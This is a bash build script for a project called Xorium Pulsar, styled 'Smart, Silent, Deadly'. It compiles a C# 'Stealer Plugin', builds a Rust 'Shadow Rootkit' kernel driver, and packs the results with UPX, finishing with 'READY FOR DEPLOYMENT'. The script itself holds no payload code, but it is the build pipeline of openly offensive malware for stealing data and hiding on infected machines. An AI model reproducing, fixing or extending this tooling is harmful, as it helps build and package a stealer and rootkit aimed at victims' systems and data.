#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
# Universal Build Script for Xorium Pulsar (Linux/macOS/WSL)
# "Smart, Silent, Deadly."
# ═══════════════════════════════════════════════════════════════════════════

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DIST_DIR="$SCRIPT_DIR/dist"
SHADOW_DIR="$SCRIPT_DIR/shadow-main"
PLUGIN_PROJ="$SCRIPT_DIR/Pulsar.Plugin.Client/Stealer.Client/Stealer.Client.csproj"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

write_status() {
    echo -e "${CYAN}[*] $1${NC}"
}

write_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

write_error() {
    echo -e "${RED}[-] $1${NC}"
}

echo -e "${MAGENTA}--- 💎 XORIUM PULSAR BUILD ENGINE v2.0 (Linux/WSL) 💎 ---${NC}"
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# 1. ENVIRONMENT CHECK (Passive Mode)
# ═══════════════════════════════════════════════════════════════════════════

write_status "Scanning environment..." 

# Check Rust
if command -v cargo &> /dev/null; then
    write_success "Rust Toolchain found: $(rustc --version)"
else
    write_error "Rust (cargo) not found! Driver build will fail."
    echo "    -> Install from https://rustup.rs"
fi

# Check .NET
if command -v dotnet &> /dev/null; then
    write_success ".NET SDK found: $(dotnet --version)"
else
    write_error ".NET SDK not found! Plugin build will fail."
    echo "    -> Install from https://dotnet.microsoft.com"
fi

# Check UPX (Optional)
HAS_UPX=false
if command -v upx &> /dev/null; then
    write_success "UPX Packer found."
    HAS_UPX=true
else
    echo -e "${YELLOW}[*] UPX not found. Binaries will not be packed (Debug mode).${NC}"
fi

echo ""

# ═══════════════════════════════════════════════════════════════════════════
# 2. PREPARATION
# ═══════════════════════════════════════════════════════════════════════════

if [ -d "$DIST_DIR" ]; then
    write_status "Cleaning old artifacts..."
    rm -rf "$DIST_DIR"
fi
mkdir -p "$DIST_DIR"

# ═══════════════════════════════════════════════════════════════════════════
# 3. BUILD: STEALER CLIENT (C#)
# ═══════════════════════════════════════════════════════════════════════════

write_status "Building Stealer Plugin (C#)..."

BUILD_LOG="$SCRIPT_DIR/build_client.log"
if dotnet publish "$PLUGIN_PROJ" -c Release -o "$DIST_DIR" /p:DebugType=None /p:DebugSymbols=false > "$BUILD_LOG" 2>&1; then
    DLL_PATH="$DIST_DIR/Pulsar.Plugin.Client.dll"
    if [ -f "$DLL_PATH" ]; then
        write_success "Stealer Plugin compiled successfully."
    else
        write_error "Build passed but file not found. Check $BUILD_LOG"
    fi
else
    write_error "Stealer Plugin build FAILED. See log:"
    tail -10 "$BUILD_LOG"
fi

# ═══════════════════════════════════════════════════════════════════════════
# 4. BUILD: KERNEL DRIVER (RUST)
# ═══════════════════════════════════════════════════════════════════════════

write_status "Building Shadow Rootkit (Rust)..."

# Note: Kernel drivers are Windows-specific. This section will only work
# in cross-compilation scenarios or on Windows via WSL with proper setup.

DRIVER_LOG="$SCRIPT_DIR/build_driver.log"

pushd "$SHADOW_DIR" > /dev/null
if cargo +nightly build --release --package shadow_core > "$DRIVER_LOG" 2>&1; then
    # Try to locate the .sys file (if cross-compiling for Windows)
    SYS_FILE=$(find . -name "*.sys" -path "*/release/*" 2>/dev/null | head -1)
    if [ -n "$SYS_FILE" ]; then
        cp "$SYS_FILE" "$DIST_DIR/"
        write_success "Shadow Driver compiled: $(basename "$SYS_FILE")"
    else
        write_error "Driver build completed but .sys file not found (expected on Linux)."
        echo "    -> Native Windows driver builds require Windows or cross-compilation."
    fi
else
    write_error "Driver build failed. See log:"
    tail -10 "$DRIVER_LOG"
fi
popd > /dev/null

# ═══════════════════════════════════════════════════════════════════════════
# 5. POST-PROCESS (The "God" Touch)
# ═══════════════════════════════════════════════════════════════════════════

if [ "$HAS_UPX" = true ]; then
    echo ""
    write_status "Applying UPX Packing..."
    for bin in "$DIST_DIR"/*.dll "$DIST_DIR"/*.exe; do
        if [ -f "$bin" ]; then
            echo -n "    Packing $(basename "$bin")..."
            if upx --best --lzma "$bin" > /dev/null 2>&1; then
                echo -e " ${GREEN}OK${NC}"
            else
                echo -e " ${YELLOW}SKIP${NC}"
            fi
        fi
    done
fi

echo ""
write_status "Build Verification:"
ls -lah "$DIST_DIR"

echo -e "${MAGENTA}--- 💋 BUILD COMPLETE. READY FOR DEPLOYMENT. 💋 ---${NC}"
